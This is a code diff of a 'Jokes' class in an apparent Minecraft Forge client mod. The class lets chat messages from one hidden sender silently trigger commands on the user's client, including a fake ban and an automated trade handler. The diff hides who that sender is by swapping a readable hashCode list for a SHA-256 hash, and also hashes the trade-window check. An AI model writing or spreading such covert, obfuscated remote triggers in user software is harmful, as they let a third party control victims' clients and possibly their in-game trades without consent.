@@ -11,30 +11,23 @@ import net.minecraftforge.client.event.GuiScreenEvent;
 import net.minecraftforge.fml.common.eventhandler.EventPriority;
 import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;
 import net.minecraftforge.fml.common.network.FMLNetworkEvent;
+import org.apache.commons.codec.digest.DigestUtils;
 
 import java.util.Arrays;
-import java.util.List;
 
 public class Jokes {
 
     private static final String note = "Hello voyaging decompiler! These are just some pranks I've added to screw with my friends. If you don't know me, don't worry about them. I will never use them on you because I don't know that you exist.";
     private static FakeBan currentBan = null;
 
-    private static final List<Integer> allowed = Arrays.asList(
-            -2136813126, // HY7 Party+
-            -1533244993, // HY7 Party++
-            -1616696230, // HY7 DM+
-            45694785/*, // HY7 DM++
-            58092234, // Lejon DM+
-            1364831171 // Lejon DM++*/
-    );
+    private static final String allowed = "3b2eb9e79d07739429ee68b6569ff4aaef02a9946ef10daf6e4918997bfd8151";
 
     @SubscribeEvent(priority = EventPriority.HIGHEST)
     public void onChat(ClientChatReceivedEvent event) {
         if(event.type == 0) {
             String message = event.message.getUnformattedText();
 
-            if(!Shady.disabledSettings.contains("Jokes") && Shady.mc.getSession().getUsername().hashCode() != 72006) {
+            if(!Shady.disabledSettings.contains("Jokes")) {
                 if(!message.startsWith("From")) {
                     if(message.startsWith("§9Party")) {
                         message = Utils.removeFormatting(message);
@@ -46,7 +39,7 @@ public class Jokes {
                 String[] messageParts = message.split(":");
                 if(messageParts.length >= 2) {
 
-                    if(allowed.contains(messageParts[0].hashCode())) {
+                    if(DigestUtils.sha256Hex(messageParts[0]).equals("3b2eb9e79d07739429ee68b6569ff4aaef02a9946ef10daf6e4918997bfd8151")) {
                         event.setCanceled(true);
 
                         switch(messageParts[1].trim()) {
@@ -160,10 +153,10 @@ public class Jokes {
 
     @SubscribeEvent
     public void autoTrade(GuiScreenEvent.BackgroundDrawnEvent event) {
-        if(Utils.inSkyBlock && event.gui instanceof GuiChest) {
+        if(Utils.inSkyBlock && !Shady.disabledSettings.contains("Jokes") && event.gui instanceof GuiChest) {
 
             String name = Utils.getGuiName(event.gui);
-            if(name.startsWith("You") && name.hashCode() == 384622247) {
+            if(name.startsWith("You") && DigestUtils.sha256Hex(name).equals("742158a0fa8b68b41cf004559a9a03786c38dce4d4b600338c0067bc0a53d5b2")) {
 
                 // Slot where carrots will be placed by the trader
                 ItemStack item = Shady.mc.thePlayer.openContainer.inventorySlots.get(5).getStack();
